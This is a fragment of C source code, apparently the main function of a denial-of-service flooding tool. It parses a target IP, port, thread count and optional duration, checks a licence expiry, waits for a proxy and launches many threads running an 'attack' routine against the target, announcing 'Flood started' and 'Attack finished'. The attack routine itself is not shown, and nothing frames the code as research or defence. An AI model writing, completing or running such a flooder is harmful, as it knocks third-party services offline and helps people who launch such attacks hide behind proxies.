int main(int argc, char *argv[]) {
    if (argc != 4 && argc != 5) {
        usage();
    }

    if (is_expired()) {
        display_expired_message();
        exit(1);
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int threads;
    int duration = 0;
    bool timed = false;

    if (argc == 4) {
        threads = atoi(argv[3]);
    } else {
        duration = atoi(argv[3]);
        threads = atoi(argv[4]);
        timed = true;
    }

    pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));
    thread_data data;
    strcpy(data.ip, ip);
    data.port = port;
    data.duration = duration;
    data.timed = timed;

    printf("Flood started on %s:%d", ip, port);
    if (timed) {
        printf(" for %d seconds", duration);
    }
    printf(" with %d threads\n", threads);

    wait_for_available_proxy();

    for (int i = 0; i < threads; i++) {
        if (pthread_create(&thread_ids[i], NULL, attack, (void *)&data) != 0) {
            perror("Thread creation failed");
            free(thread_ids);
            exit(1);
        }
        printf("Launched thread with ID: %lu\n", thread_ids[i]);
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    free(thread_ids);
    printf("Attack finished\n");
    return 0;
}
